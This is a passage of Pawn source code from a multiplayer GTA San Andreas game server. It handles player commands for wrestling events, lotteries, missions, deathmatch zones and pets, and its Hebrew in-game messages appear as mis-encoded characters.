			if(wweinfo[0]) return SendClientMessage(playerid,red," .WWE ыс° щ∙");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx), wweinfo[4] = !strlen(cmd) ? random(3) : strval(cmd) - 1;
			if(wweinfo[4] < 0) wweinfo[4] = 0;
			if(wweinfo[4] > 2) wweinfo[4] = 2;
			StartWWE();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ WWE рщя");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndWWE(reason,playerid);
		}
		else if(equal(cmd,"viewer"))
		{
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ WWE рщя");
			if(playerinfo[playerid][waitwwe]) return SendClientMessage(playerid,red," .WWE рщЁъ щыхь ьфщх· ЎхЇф ыр∙° р·ф фхьъ ьў°с ф");
			if(playerinfo[playerid][modeafk] ||
			playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфщх· ЎхЇф сюЎсъ фЁхычщ");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(wweinfo[2] > 1) return SendClientMessage(playerid,red," .фў°с Єху ьр ф·чщь");
			if(GetMoney(playerid) < 150) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фцх фхр 150$");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd))
			{
				SendClientMessage(playerid,white," /wwe viewer [number] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," /wwe viewer 0 :фЇёў· фЎЇщщф");
				SendClientMessage(playerid,white," /wwe viewer [1/2] :WWE ЎЇщщф срчу юю∙··Їщ ф");
			}
			new pnum = strval(cmd);
			if(pnum < 0 || pnum > 2) return SendClientMessage(playerid,red," .юёЇ° ∙чўя ∙тхщ");
			if(!pnum)
			{
				if(!playerinfo[playerid][viewerwwe]) return SendClientMessage(playerid,red," .р·ф ьр ЎхЇф сў°с");
				playerinfo[playerid][inact] = 0;
				SetPlayerVirtualWorld(playerid,0);
				TogglePlayerSpectating(playerid,0);
				SpawnPlayer(playerid);
				playerinfo[playerid][viewerwwe] = 0;
			}
			else
			{
				playerinfo[playerid][inact] = 1;
				playerinfo[playerid][viewerwwe] = 1;
				SetPlayerVirtualWorld(playerid,world_wwe);
				SetPlayerInterior(playerid,GetPlayerInterior(wwejoins[pnum-1]));
				TogglePlayerSpectating(playerid,1);
				PlayerSpectatePlayer(playerid,wwejoins[pnum-1]);
				SendClientMessage(playerid,lightblue," Х Х :с·х° ЎхЇф WWE фЎш°Ї· ь·ч°х· ф Х Х");
				SendClientMessage(playerid,orange," Х /wwe viewer 0 :ьфЇёў· фЎЇщщф");
				SendClientMessage(playerid,orange," Х /wwe viewer 1 :ЎЇщщф сю·ч°ф юёЇ° #1");
				SendClientMessage(playerid,orange," Х /wwe viewer 2 :ЎЇщщф сю·ч°ф юёЇ° #2");
				SendClientMessage(playerid,purple," ╗ !ЎЇщщф юфЁф");
			}
		}
		else SendClientMessage(playerid,red," .∙тхщф WWE рЇ∙°х·");
		return 1;
	}
	if(equal(cmd,"/lotto"))
	{
		if(lottonum[0] == -1) return SendClientMessage(playerid,red," .рщя фт°ь· ьхшх ыЄ·");
		if(playerinfo[playerid][plotto] != -1) return SendClientMessage(playerid,red," .Ёщ·я ь∙ьхч ьхшх ЇЄэ рч· сфт°ьф рч· сьсу");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /lotto [1-50] :Ўх°· ф∙щюх∙");
		new num = strval(cmd);
		if(num < 1 || num > 50) return SendClientMessage(playerid,red," .фюёЇ° Ў°щъ ьфщх· сщя 1 ь 50");
		playerinfo[playerid][plotto] = num;
		if(num == lottonum[0] && lottonum[1] == -1) lottonum[1] = playerid;
		SendClientMessage(playerid,green," .фюёЇ° Ё∙ьч ьфт°ьф, рЁр фю·я Єь юЁ· ь°рх· рэ цыщ·");
		return 1;
	}
	if(equal(cmd,"/dlotto"))
	{
		if(specialActivity != sa_dlotto) return SendClientMessage(playerid,red," .рщя фт°ь· урсь ьхшх ыЄ·");
		if(playerinfo[playerid][plotto] != -1) return SendClientMessage(playerid,red," .Ёщ·я ь∙ьхч ьхшх ЇЄэ рч· сфт°ьф рч· сьсу");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /dlotto [1-100] :Ўх°· ф∙щюх∙");
		new num = strval(cmd);
		if(num < 1 || num > 100) return SendClientMessage(playerid,red," .фюёЇ° Ў°щъ ьфщх· сщя 1 ь 100");
		playerinfo[playerid][plotto] = num;
		if(num == dlottonum[0] && dlottonum[1] == -1) dlottonum[1] = playerid;
		SendClientMessage(playerid,green," $$ фюёЇ° Ё∙ьч ьфт°ь· фурсь ьхшх, рЁр фю·я Єь юЁ· ьсухў рэ цыщ· $$");
		return 1;
	}
	if(equal(cmd,"/startlotto") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0 || thereIsWol) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ю∙Ёщ· ЇхЄь·");
		if(specialActivity == sa_dlotto) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сурсь ьхшх");
		Lotto();
		return 1;
	}
	if(equal(cmd,"/missions"))
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф·чщь ю∙щюф ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф·чщь ю∙щюф ы∙р° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф·чщь ю∙щюф ы∙р° р·ф сЇЄщьх·");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
		if(playerinfo[playerid][mstimenew] != 0)
		{
			if(playerinfo[playerid][mstimenew] < 60) return SendClientMessage(playerid, red, " .·хыь ьсЎЄ Їўхуф цх суўф фў°хсф");
			new str[M_S];
			format(str, M_S, " .·хыь ьсЎЄ Їўхуф цх сЄху ы %d уўх·", playerinfo[playerid][mstimenew] / 60);
			return SendClientMessage(playerid, red, str);
		}
		if(playerinfo[playerid][mission] != INVALID_MISSION_ID) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр сю∙щюф");
		if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьсЎЄ Їўхуф цх с·хъ рцх° ущ-рэ");
		new tname[M_S], string[1024];
		for(new i = 0; i < sizeof(MissionsInfo); i++)
		{
		    format(tname,sizeof(tname),@c(green) " %s " @c(lightyellow) "- " @c(white) "%s (Condition: %s" @c(white) ", Money: %d$, Level: %s)\n",MissionsInfo[i][msTdName],MissionsInfo[i][msName],missions[i] ? ("" @c(red) " ·Їхё") : ("Ёщ·я ьыЁщёф"),MissionsInfo[i][msMoney],MissionsInfo[i][msLevel]);
			strcat(string,tname);
		}
		ShowPlayerDialog(playerid,dialog_missions,DIALOG_STYLE_LIST,@c(lightblue) " ·Ї°щш фю∙щюх·",string,"ыЁщёф","щЎщрф");
		return 1;
 	}
	if(equal(cmd,"/dm"))
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
		new tname[128], string[1024], dmCount[max_dmzs];
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][dmzone] != dmz_none) dmCount[playerinfo[i][dmzone]]++;
		for(new i = 1; i < sizeof(DMZs); i++)
		{
			strmid(tname,DMZs[i][dmzCmd],1,strlen(DMZs[i][dmzCmd]));
			if(DMZs[i][dmzWorlds] > 1) format(tname,sizeof(tname),@c(green) "%s" @c(lightyellow) " - " @c(white) "%s (Players: %d, Worlds: %d)",tname,DMZs[i][dmzName],dmCount[i],DMZs[i][dmzWorlds]);
			else format(tname,sizeof(tname),@c(green) "%s" @c(lightyellow) " - " @c(white) "%s (Players: %d)",tname,DMZs[i][dmzName],dmCount[i]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		format(string,sizeof(string),"%s\n" @c(grey) "/QuitDMZ (/QDMZ) " @c(lightyellow) " - " @c(white) "щЎщрф юрцх° фущ-рэ",string);
		ShowPlayerDialog(playerid,dialog_dm,DIALOG_STYLE_LIST," ·Ї°щш рцх°щ фущ-рэ",string,"ыЁщёф","щЎщрф");
		return 1;
	}
	for(new i = 0; i < sizeof(DMZs); i++) if(equal(cmd,DMZs[i][dmzCmd]))
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
		if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сў°с");
		if(WaitingAct(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ьЇЁщ ыЁщёф ьЇЄщьх·");
		if(playerinfo[playerid][test] != -1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф срцх° шёшщэ");
		if(!playerinfo[playerid][returntodm] && playerinfo[playerid][dmzone] == i) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр срцх° фущрэ фцф");
		if(playerinfo[playerid][inhouse] > -1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° ыр∙° р·ф с·хъ сщ·");
		if(playerinfo[playerid][inshooting] != -1) return SendClientMessage(playerid,red," .Shooting-ьр Ёщ·я ьф∙·т° ыр∙° р·ф с");
		if(playerinfo[playerid][instunting] != -1) return SendClientMessage(playerid,red," .Stunting-ьр Ёщ·я ьф∙·т° ыр∙° р·ф с");
		new string[M_S], ps = 0, stat = 0, slot = 1, dmC = 0;
		if(playerinfo[playerid][level] < DMZs[i][dmzLevel])
		{
			format(string,sizeof(string)," .сыущ ьф∙·т° ьрцх° фущ-рэ фцф Єьщъ ьфщх· ьЇчх· с°юф %d",DMZs[i][dmzLevel]);
			return SendClientMessage(playerid,green,string);
		}
		for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][dmzone] == i && i != playerid) dmC++;
		if(dmC >= MAX_DMZ_PLAYERS) return SendClientMessage(playerid,red," .рцх° ущ-рэ цф фтщЄ ьють· ф∙чўЁщэ (" #MAX_DMZ_PLAYERS "), Ёёф ∙хс юрхч° щх·°");
		if(DMZs[i][dmzWorlds] > 1)
		{
			format(string,sizeof(string),cmd);
			cmd = strtok(cmdtext,idx), slot = !strlen(cmd) ? 1 : strval(cmd);
			if(slot < 1 || slot > DMZs[i][dmzWorlds])
			{
				format(string,sizeof(string)," .юёЇ° Єхьэ ∙ь рцх° ущрэ ∙тхщ, щ∙ ьсчх° юёЇ° сщя 1 ь %d",DMZs[i][dmzWorlds]);
				return SendClientMessage(playerid,red,string);
			}
			SetPlayerVirtualWorld(playerid,worlds_dmz + i + (slot - 1));
			format(cmd,sizeof(cmd),string);
		}
		else SetPlayerVirtualWorld(playerid,worlds_dmz + i);
		playerinfo[playerid][dmzone] = i, playerinfo[playerid][dmworld] = slot;
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		if(playerinfo[playerid][spweapon] != spw_none) DropSPW(playerid);
		if(playerinfo[playerid][powerparam] > powerparam_none) StopUsingPower(playerid);
		ResetWeapons(playerid);
		ResetAttachedObjects(playerid);
		SetPlayerHealth(playerid,DMZs[i][dmzHStatus][0]);
		SetPlayerArmour(playerid,DMZs[i][dmzHStatus][1]);
		HidePlayerDialog(playerid);
		if(equal(cmd,"/mm"))
		{
			new rnd = random(sizeof(WarPositions_9));
			SetPlayerPos(playerid,WarPositions_9[rnd][0],WarPositions_9[rnd][1],WarPositions_9[rnd][2]);
			SetPlayerFacingAngle(playerid,WarPositions_9[rnd][3]);
			GiveWeapon(playerid,38,10000);
			stat = 1;
		}
		else if(equal(cmd,"/uj"))
		{
			new rnd = random(sizeof(DMZ_RandomSpawns_Jetp));
			SetPlayerPos(playerid,DMZ_RandomSpawns_Jetp[rnd][0],DMZ_RandomSpawns_Jetp[rnd][1],DMZ_RandomSpawns_Jetp[rnd][2]);
			SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_Jetp[rnd][3]);
			GiveJetpack(playerid);
			GiveWeapon(playerid,!random(2) ? (!random(2) ? 28 : 32) : (!random(2) ? 26 : 22),100000);
		}
		else if(equal(cmd,"/matrix"))
		{
			new rnd = random(sizeof(WarPositions_10));
			SetPlayerPos(playerid,WarPositions_10[rnd][0],WarPositions_10[rnd][1],WarPositions_10[rnd][2]);
			SetPlayerFacingAngle(playerid,WarPositions_10[rnd][3]);
			GiveWeapon(playerid,!random(2) ? 24 : 23,10000);
		}
		else if(equal(cmd,"/rcwar"))
		{
			new rnd = random(sizeof(DMZ_RandomSpawns_RCWar));
			SetPlayerPos(playerid,DMZ_RandomSpawns_RCWar[rnd][0],DMZ_RandomSpawns_RCWar[rnd][1],DMZ_RandomSpawns_RCWar[rnd][2]);
			SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_RCWar[rnd][3]);
			playerinfo[playerid][dmzone] = dmz_rcwar;
		}
		else if(equal(cmd,"/heavy"))
		{
			new rnd = random(sizeof(WarPositions_7));
			SetPlayerPos(playerid,WarPositions_7[rnd][0],WarPositions_7[rnd][1],WarPositions_7[rnd][2]);
			SetPlayerFacingAngle(playerid,WarPositions_7[rnd][3]);
			GiveWeapon(playerid,24,10000);
			GiveWeapon(playerid,!random(2) ? 27 : 25,10000);
			GiveWeapon(playerid,!random(2) ? 30 : 31,10000);
			GiveWeapon(playerid,!random(2) ? 33 : 34,10000);
		}
		else if(equal(cmd,"/grenmol"))
		{
			new rnd = random(sizeof(DMZ_RandomSpawns_Mol));
			SetPlayerPos(playerid,DMZ_RandomSpawns_Mol[rnd][0],DMZ_RandomSpawns_Mol[rnd][1],DMZ_RandomSpawns_Mol[rnd][2]);
			SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_Mol[rnd][3]);
			GiveWeapon(playerid,ChoosenWeapon(playerid,wtype_throw),10000);
			stat = 2;
		}
		else if(equal(cmd,"/fire"))
		{
			new rnd = random(sizeof(DMZ_RandomSpawns_FireMadness));
			SetPlayerPos(playerid,DMZ_RandomSpawns_FireMadness[rnd][0],DMZ_RandomSpawns_FireMadness[rnd][1],DMZ_RandomSpawns_FireMadness[rnd][2]);
			SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_FireMadness[rnd][3]);
			GiveWeapon(playerid,37,10000);
		}
		else if(equal(cmd,"/war"))
		{
			new rnd = random(sizeof(WarPositions_1));
			SetPlayerPos(playerid,WarPositions_1[rnd][0],WarPositions_1[rnd][1],WarPositions_1[rnd][2]);
			SetPlayerFacingAngle(playerid,WarPositions_1[rnd][3]);
			SetPlayerPos(playerid,-1421.6965 + float(randomEx(-5,6)),1257.4225 + float(randomEx(-5,6)),1039.8672);
			SetPlayerFacingAngle(playerid,243.5434);
			GiveWeapon(playerid,22,10000);
			GiveWeapon(playerid,26,10000);
			GiveWeapon(playerid,ChoosenWeapon(playerid,wtype_microsmg),10000);
			GiveWeapon(playerid,ChoosenWeapon(playerid,wtype_assault),10000);
			GiveWeapon(playerid,34,10000);
			stat = 2;
		}
		else if(equal(cmd,"/gungame"))
		{
			new rnd = random(sizeof(DMZ_GunGame));
			SetPlayerPos(playerid,DMZ_GunGame[rnd][0],DMZ_GunGame[rnd][1],DMZ_GunGame[rnd][2]);
			SetPlayerFacingAngle(playerid,DMZ_GunGame[rnd][3]);
		}
		else if(equal(cmd,"/shavuot"))
		{
			new rnd = random(sizeof(Kickstar));
			SetPlayerPos(playerid,Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2]);
			SetPlayerFacingAngle(playerid,Kickstar[rnd][3]);
			ResetMoney(playerid);
			new o = CreateSObject(18738 + random(3),Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2],0.0,0.0,0.0);
			objectinfo[o][odam] = 1;
			MoveSObject(o,Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2]-12.0,5.0);
		}
		else if(equal(cmd,"/pirates"))
		{
			new rnd = random(sizeof(DMZ_Pirates));
			SetPlayerPos(playerid,DMZ_Pirates[rnd][0],DMZ_Pirates[rnd][1],DMZ_Pirates[rnd][2]+3.0);
			SetPlayerFacingAngle(playerid,DMZ_Pirates[rnd][3]);
			SetPlayerAttachedObject(playerid,aoslot_purim,19085,2,0.09,0.02,0.0,90.0,90.0,0.0,1.0,1.0,1.0);
			SetPlayerAttachedObject(playerid,aoslot_purim+1,19078,3,0.0,0.0,0.0,140.0,180.0,0.0,0.7,0.7,0.7);
			SetPlayerAttachedObject(playerid,aoslot_purim+2,339,6,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.6);
			GiveWeapon(playerid,8,0);
			GiveWeapon(playerid,27,10000);
			GiveWeapon(playerid,28,10000);
			GiveWeapon(playerid,31,10000);
			GiveWeapon(playerid,34,10000);
			GiveWeapon(playerid,16,1);
		}
		else if(equal(cmd,"/boatsdm"))
		{
		    new rnd = random(sizeof(DMZ_Boats));
			playerinfo[playerid][bvehicle] = CreateVehicle(430,DMZ_Boats[rnd][0] + float(randomEx(-5,6)),DMZ_Boats[rnd][1] + float(randomEx(-5,6)),DMZ_Boats[rnd][2],DMZ_Boats[rnd][3],255,0,-1);
			SetPlayerPos(playerid,DMZ_Boats[rnd][0],DMZ_Boats[rnd][1],DMZ_Boats[rnd][2]);
			SetVehicleVirtualWorld(playerinfo[playerid][bvehicle],GetPlayerVirtualWorld(playerid));
			PutPlayerInVehicle(playerid,playerinfo[playerid][bvehicle],0);
			stat = 3;
		}
		else if(equal(cmd,"/cbugdm"))
		{
		    new rnd = random(sizeof(DMZ_Deagle));
			SetPlayerPos(playerid,DMZ_Deagle[rnd][0],DMZ_Deagle[rnd][1],DMZ_Deagle[rnd][2]);
			SetPlayerFacingAngle(playerid,DMZ_Deagle[rnd][2]);
			GiveWeapon(playerid,24,10000);
			GiveWeapon(playerid,25,10000);
		}
		if(!playerinfo[playerid][noticedmsg][3])
		{
			if(DMZs[i][dmzWorlds] > 1) format(string,sizeof(string)," !%s #%d с°хъ фср ьрцх° фущ-рэ",DMZs[i][dmzName],slot);
			else format(string,sizeof(string)," !%s с°хъ фср ьрцх° фущ-рэ",DMZs[i][dmzName]);
			SendClientMessage(playerid,green,string);
			SendClientMessage(playerid,green," .рх ф∙·т° ьюўхэ рч° /qdmz - Єь юЁ· ьЎр· юфрцх°, °∙хэ р· фЇўхуф");
			if(stat == 1) SendClientMessage(playerid,red," .срцх° ущ-рэ цф, ыь 5 ф°щтх· ∙хх· ьрч·");
			else if(stat == 2) SendClientMessage(playerid,red," /WTypes :·хыь ьфчьщє р· фЁ∙ўщэ ∙ьъ срцх° фущ-рэ фцф Єэ фЇўхуф");
			else if(stat == 3)
			{
			    SendClientMessage(playerid,yellow," !срцх° ущ-рэ цф ·ўсь ёщ°ф Єэ рхЇЎщф ютЁщсф ∙·хыь ьщ°х ююЁф хьфщьчэ с∙р° ф∙чўЁщэ ∙ЁюЎрщэ срцх°");
				SendClientMessage(playerid,red," .∙щэ ьс: сющуф х·Ўр юфёщ°ф фюЄ°ы· ·хЎщр рх·ъ юфрцх° рхшхюшщ·");
			}
			if(DMZs[i][dmzUsingLevels]) SendClientMessage(playerid,yellow," .срцх° ущ-рэ цф щ∙ °юх·. ыыь ∙·ф°хт щх·° ∙чўЁщэ, ·Єьф с°юф х·ўсь Ё∙ўщэ шхсщэ щх·°");
			playerinfo[playerid][noticedmsg][3] = 1;
			playerinfo[playerid][dmzlevel] = 1;
			SavePlayerWeapons(playerid);
		}
		if(!playerinfo[playerid][fmsg][0]) playerinfo[playerid][fmsg][1] = 600, playerinfo[playerid][fmsggo][1] = 10, playerinfo[playerid][fmsgparam] = i;
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,DMZs[i][dmzInterior]);
		if(IsPlayerUsingSGuard_(playerid)) SetPlayerGravity(playerid,DMZs[i][dmzGravity]); // guard_shit
		if(DMZs[i][dmzUsingLevels]) GivePlayerDMZLevelWeapons(playerid);
		if(!DMZsDelay[i])
		{
			for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][dmzone] == i && playerinfo[j][dmworld] == 1) ps++;
			if(ps >= 5)
			{
				format(string,sizeof(string)," %s !фЎш°Їх рьщфэ Єы∙щх ,%s ы°тЄ %d ∙чўЁщэ ю∙чўщэ срцх° фущ-рэ",DMZs[i][dmzCmd],DMZs[i][dmzName],ps);
				News(string);
				DMZsDelay[i] = 300;
			}
		}
		SetTimerEx("ResetWait",1000,0,"i",playerid);
		return 1;
	}
	for(new i = 0; i < sizeof(TDMZs); i++) if(equal(cmd,TDMZs[i][tdmzCmd]) || equal(cmd,TDMZs[i][tdmzCmdS]))
	{
		if(!Options[14][optActive]) return SendClientMessage(playerid,red," .ьр Ї·хч TDM-рцх° ф");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьрцх° ущ-рэ ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
		if(WaitingAct(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ьЇЁщ ыЁщёф ьЇЄщьх·");
		//if(!playerinfo[playerid][returntodm] && playerinfo[playerid][tdmzone] == i) return SendClientMessage(playerid,red," .р·ф ыс° ЁюЎр срцх° фшщущрэ фцф");
		new string[300], teamPlayers[4];
		if(playerinfo[playerid][level] < TDMZs[i][tdmzLevel])
		{
			format(string,sizeof(string)," .сыущ ьф∙·т° ьрцх° фшщущрэ фцф Єьщъ ьфщх· ьЇчх· с°юф %d",TDMZs[i][tdmzLevel]);
			return SendClientMessage(playerid,green,string);
		}
		for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][tdmzone] == i) teamPlayers[playerinfo[j][tdmclick][1]]++;
		for(new j = 0; j < TDMZs[i][tdmzTeams]; j++) format(string,sizeof(string),!j ? ("%s{%s}Team %c - %d players") : ("%s\n{%s}Team %c - %d players"),string,HexStringOfColor(TDMZs[i][tdmzColors][j]),'A' + j,teamPlayers[j]);
		ShowPlayerDialog(playerid,dialog_tdm,DIALOG_STYLE_LIST,@c(lightblue) "TDM счщ°· ўсхЎф ь∙щтх°",string,"фср","ётх°");
		playerinfo[playerid][tdmclick][0] = i;
		return 1;
	}
	if(equal(cmd,"/quitdmz") || equal(cmd,"/qdmz"))
	{
		if(playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none) return SendClientMessage(playerid,red," .р·ф ьр ЁюЎр срцх° ущ-рэ");
		OutOfDMZone(playerid);
		SendClientMessage(playerid,green," .щЎр· юрцх° фущ-рэ");
		SetTimerEx("SpawnTimer", 500, 0, "d", playerid);
		return 1;
	}
	if(equal(cmd,"/pets"))
	{
		if(!IsPlayerInStore(playerid,store_pets)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фчщх· ьсщЎхЄ Їўхуф цх");
		new line[128], string[1024];
		for(new i = 1; i < sizeof(Pets); i++)
		{
			format(line,sizeof(line),@c(green) "%d) " @c(lightgreen) "%s (%s)" @c(lightyellow) " - $%d",i,Pets[i][petHebName],Pets[i][petName],Pets[i][petCost]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,line);
		}
		ShowPlayerDialog(playerid,dialog_pets,DIALOG_STYLE_LIST,@c(lightblue) "чщх·",string,"ўЁщщф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/pet"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /pet [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /pet on - юхЎщр р· фчщф ∙ьъ");
			SendClientMessage(playerid,white," /pet off - ючсщр р· фчщф ∙ьъ");
			SendClientMessage(playerid,white," /pet attack [id] - рхю° ьчщф ∙ьъ ь·ўхє");
			SendClientMessage(playerid,white," /pet stop - юЇёщў р· ф·ўЇ· фчщф ∙ьъ");
			SendClientMessage(playerid,white," /pet remove - ючщў· фчщф ∙ьъ");
			return 1;
		}
		if(equal(cmd,"on"))
		{
			if(!playerinfo[playerid][pet][0]) return SendClientMessage(playerid,red," .рщя ьъ чщф");
			if(playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .фчщф ∙ьъ ыс° счхї");
			if(!CanUseCommand(playerid)) return 1;
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхЎщр чщф с°ыс");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхЎщр чщф сюўхюъ фЁхычщ");
			if(GetPlayerVirtualWorld(playerid) == 267) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхЎщр чщф сюўхюъ фЁхычщ");
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			playerinfo[playerid][pet][1] = CreateObject(Pets[playerinfo[playerid][pet][0]][petModel],p[0]+(playerinfo[playerid][pet][0] >= pet_turtle? 7.0:3.0),p[1],p[2],0.000000,0.000000,0.000000);
			playerinfo[playerid][pet][2] = 1;
			playerinfo[playerid][pet][3] = 0;
			AttachObjectToPlayer(playerinfo[playerid][pet][1],playerid,Pets[playerinfo[playerid][pet][0]][petOffset][0],Pets[playerinfo[playerid][pet][0]][petOffset][1],Pets[playerinfo[playerid][pet][0]][petOffset][2],Pets[playerinfo[playerid][pet][0]][petOffset][3],Pets[playerinfo[playerid][pet][0]][petOffset][4],Pets[playerinfo[playerid][pet][0]][petOffset][5]);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][pet][0]) return SendClientMessage(playerid,red," .рщя ьъ чщф");
			if(!playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .фчщф ∙ьъ ьр счхї");
			if(playerinfo[playerid][pet][3]) StopPetAttacking(playerid);
			DestroyObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			playerinfo[playerid][pet][3] = 0;
		}
		else if(equal(cmd,"attack"))
		{
			if(!playerinfo[playerid][pet][0]) return SendClientMessage(playerid,red," .рщя ьъ чщф");
			if(!playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .фчщф ∙ьъ ьр счхї");
			if(playerinfo[playerid][pet][3]) return SendClientMessage(playerid,red," .фчщф ∙ьъ ыс° ·хўЇ·");
			new id, Float:p[4];
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /pet attack [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .фчщф ∙ьъ ьр щыхьф ь·ўхє рх·ъ");
